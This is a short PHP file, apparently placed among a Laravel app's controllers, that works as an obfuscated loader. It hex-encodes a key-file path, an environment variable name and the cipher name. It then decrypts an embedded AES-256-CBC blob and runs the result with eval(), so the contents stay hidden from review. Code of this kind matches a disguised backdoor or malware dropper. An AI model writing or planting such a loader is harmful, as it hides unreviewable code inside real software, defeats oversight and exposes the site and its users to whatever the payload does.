<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('aU4xtSxCMoGzqWsAkr5+9g==');

$c=base64_decode(

'NXVgtO0hLBfnhikWfIxSqT9dYpkfKoI2Kau2qKCYJ3pAbvR2w6jdtB1SsepJ/TfGdjfc/X11VgTP' .
'Mx1dGaU8w0uglf8lk7c0N3klyUj5PLQDcb282y8s/KOM2B6tLHDHQwqrv81HHCK5EPqZH9tJRMle' .
'dkB4SlLImk67JvXbBPa9tVTM3IHF3moxGEmSZ+ZOWginHSJNh1EtuZyE21u41OV27UfuPUQQOpWQ' .
'weffOSB2DgOZ+vKkIEJTgNUg12eQ'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

